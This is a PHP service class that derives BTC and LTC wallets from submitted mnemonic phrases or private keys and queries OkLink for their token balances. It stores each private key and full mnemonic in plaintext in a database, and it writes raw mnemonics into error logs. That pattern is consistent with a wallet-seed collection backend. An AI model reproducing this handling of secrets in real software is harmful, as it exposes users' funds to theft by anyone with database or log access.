<?php

namespace app\common\service\common;

use app\common\facade\Chain;
use app\common\facade\ChainToken;
use app\common\facade\OkLink;
use app\common\facade\Redis;
use app\common\facade\ReportData;
use app\common\facade\WalletBalanceToken;
use app\common\model\ImportMnemonicModel;
use app\common\model\WalletBalanceTest;
use app\common\model\WalletModel;
use app\common\model\WalletTestModel;
use app\common\service\chain\BscService;
use app\common\service\chain\BtcService;
use app\common\service\chain\LtcService;
use app\common\service\chain\TronService;

class InnerService
{
    public function syncBalance(string $address, string $chain = 'OKTC')
    {
        //同步公链原生代币
        $balance = OkLink::getAddressBalance($chain, $address);
        if (!empty($balance['data'][0])) {
            //获取公链原生代币
            $origin_balance = $balance['data'][0];
            //创建钱包token
            $this->createWalletBalanceToken($chain, $address, $origin_balance['balance'], $origin_balance['balanceSymbol'], $origin_balance['balance'],
                0, 0, '', '', md5($address));
        }
    }

    public function createWalletBalanceToken(
        string $chain,
        string $address,
        string $balance,
        string $token,
        string $total_token_value,
        float $price_usd,
        float $value_usd,
        string $token_contract_address,
        string $protocol_type,
        string $mnemonic_key
    )
    {
        //检测缓存
        $key = "chain:okex:wallet:token:list:balance:test";
        if (!Redis::addSet($key, $address . '_' . $token_contract_address, 0)) return false;
        try {
            $result = WalletBalanceTest::new()->insert(
                [
                    'address' => $address,
                    'chain' => $chain,
                    'balance' => $balance,
                    'token' => $token,
                    'create_time' => time(),
                    'update_time' => time(),
                    'total_token_value' => $total_token_value,
                    'price_usd' => $price_usd,
                    'value_usd' => $value_usd,
                    'token_contract_address' => $token_contract_address,
                    'protocol_type' => $protocol_type,
                    'mnemonic_key' => $mnemonic_key,
                    'date_day' => date('Ymd'),
                ]
            );
        }catch (\Exception $e){
            $result = false;
        }
        //返回结果
        return $result;
    }

    /**
     * 钱包解析
     * @param string $mnemonic 助记词或者钱包地址
     * @param int $type 类型 1助记词 2私钥
     * @return void
     * @author Bin
     * @time 2023/7/30
     */
    public function decryptWallet(string $mnemonic, int $type = 1)
    {
        try {
            $md5 = md5($mnemonic);
            //获取公链列表
            $chain_list = [['chain' => 'BTC'], ['chain' => 'LTC']];
            //记录公链数量
            $chain_num = 0;
            foreach ($chain_list as $chain)
            {
                switch ($chain['chain'])
                {
                    case 'BTC':
                        $result = $type == 1 ? (new BtcService())->fromMnemonicV3($mnemonic) : (new BtcService())->fromPrivateKeyV3($mnemonic);
                        break;
                    case 'LTC':
                        $result = $type == 1 ? (new LtcService())->fromMnemonic($mnemonic) : (new LtcService())->fromPrivateKey($mnemonic);
                        break;
                    default:
                        $result = [];
                        break;
                }
                if (empty($result)) continue;
                //记录钱包数据
                try {
                    $data = [
                        'address' => $result['address'],
                        'chain' => $chain['chain'],
                        'private_key' => $result['private_key'],
                        'mnemonic' => $type == 1 ? $mnemonic : '',
                        'public_key' => $result['public_key'],
                        'mnemonic_key' => md5($mnemonic),
                        'create_time' => time(),
                        'update_time' => time(),
                        'date_day'  => date('Ymd'),
                    ];
                    WalletTestModel::new()->insert($data);
                }catch (\Exception $e){}
                $chain_num++;
                //异步获取钱包资产
                publisher('asyncInnerAddressBalance', ['chain' => $chain['chain'], 'address' => $result['address'], 'mnemonic_key' => $data['mnemonic_key']]);
            }
        }catch (\Exception $e){
            ReportData::recordErrorLog('decryptInnerWallet', "[$mnemonic | $type]" . $e->getMessage());
        }
    }

    /**
     * 添加钱包
     * @param string $chain
     * @param string $address
     * @return bool
     * @author Bin
     * @time 2023/7/31
     */
    public function addWallet(string $chain, string $address)
    {
        $key = "chain:{$chain}:inner:address:list";
        return Redis::addSet($key, $address, 0);
    }

    /**
     * 同步钱包余额
     * @param string $chain
     * @param string $address
     * @param string $mnemonic_key
     * @return void
     * @throws \GuzzleHttp\Exception\GuzzleException
     * @author Bin
     * @time 2023/7/26
     */
    public function syncAddressBalance(string $chain, string $address, string $mnemonic_key)
    {
        try {
            //同步公链原生代币
            $balance = OkLink::getAddressBalance($chain, $address);
            if (!empty($balance['data'][0])) {
                //获取公链原生代币
                $origin_balance = $balance['data'][0];
                //获取公链原生代币
                $origin_token = ChainToken::getChainOriginToken($chain);
                $price_usd = $origin_token['price_usd'] ?? 0;
                //创建钱包token
                $this->createWalletBalanceToken($chain, $address, $origin_balance['balance'], $origin_balance['balanceSymbol'], $origin_balance['balance'],
                    $price_usd, $origin_balance['balance'] * $price_usd, $origin_token['contract'] ?? '', '', $mnemonic_key);
            }
            //同比公链2.0代币
            $list_balance = OkLink::listAddressBalance($chain, $address);
            $tokenList = $list_balance['data'][0] ?? [];
            if (!empty($tokenList['tokenList']))
            {
                foreach ($tokenList['tokenList'] as $val)
                {
                    //创建钱包token
                    $this->createWalletBalanceToken($chain, $address, $val['holdingAmount'], $val['token'], $val['totalTokenValue'], $val['priceUsd'],
                        $val['valueUsd'], $val['tokenContractAddress'], 'token_20', $mnemonic_key);
                }
                //上报状态
                WalletTestModel::new()->updateRow(['address' => $address, 'chain' => $chain], ['is_report' => 1]);
            }
        }catch (\Exception $e){
            ReportData::recordErrorLog('syncInnerAddressBalance', "[$chain | $address]" . $e->getMessage());
        }
    }
}